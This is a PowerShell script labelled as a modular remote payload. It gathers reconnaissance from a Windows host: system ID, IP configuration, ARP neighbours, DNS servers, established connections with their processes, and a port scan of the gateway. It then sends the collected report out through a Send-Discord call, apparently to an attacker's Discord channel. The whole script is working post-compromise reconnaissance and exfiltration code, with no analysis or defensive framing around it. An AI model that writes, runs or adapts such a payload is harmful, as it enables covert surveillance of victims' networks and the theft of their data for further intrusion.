# ============================================================
# Network Scan for Windows - Modular Remote Payload
# ============================================================
# Scans local network for active hosts and open ports
# ============================================================

$sysid = Get-SystemID
$output = "🔍 **Network Scan from $sysid**`n"
$output += "📅 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
$output += "=" * 40 + "`n`n"

# Get local network info
$output += "**🌐 LOCAL NETWORK**`n"
$adapters = Get-NetIPConfiguration | Where-Object { $_.IPv4Address }
foreach ($a in $adapters) {
    $output += "• Interface: ``$($a.InterfaceAlias)```n"
    $output += "  - IP: ``$($a.IPv4Address.IPAddress)```n"
    $output += "  - Gateway: ``$($a.IPv4DefaultGateway.NextHop)```n"
}
$output += "`n"

# Get ARP table (known hosts)
$output += "**📡 ARP TABLE (Known Hosts)**`n"
$arp = Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -eq 'Reachable' -or $_.State -eq 'Stale' }
foreach ($entry in $arp | Select-Object -First 15) {
    $output += "• ``$($entry.IPAddress)`` → ``$($entry.LinkLayerAddress)`` ($($entry.State))`n"
}
$output += "`n"

# Quick port scan on gateway
$gateway = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }).IPv4DefaultGateway.NextHop | Select-Object -First 1
if ($gateway) {
    $output += "**🔓 GATEWAY PORT SCAN ($gateway)**`n"
    $commonPorts = @(21, 22, 23, 80, 443, 445, 3389, 8080)
    foreach ($port in $commonPorts) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $connect = $tcp.BeginConnect($gateway, $port, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(100, $false)
            if ($wait -and $tcp.Connected) {
                $output += "• Port ``$port``: ✅ OPEN`n"
            }
        } catch {} finally {
            $tcp.Close()
        }
    }
    $output += "`n"
}

# DNS servers
$output += "**🔎 DNS SERVERS**`n"
$dns = Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object { $_.ServerAddresses }
foreach ($d in $dns | Select-Object -First 3) {
    $output += "• $($d.InterfaceAlias): ``$($d.ServerAddresses -join ', ')```n"
}
$output += "`n"

# Active connections
$output += "**📊 ACTIVE CONNECTIONS (Top 10)**`n"
$connections = Get-NetTCPConnection -State Established | 
    Where-Object { $_.RemoteAddress -notlike '127.*' -and $_.RemoteAddress -notlike '::1' } |
    Select-Object -First 10
foreach ($c in $connections) {
    $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
    $output += "• ``$($c.LocalPort)`` → ``$($c.RemoteAddress):$($c.RemotePort)`` ($($proc.Name))`n"
}

Send-Discord $output

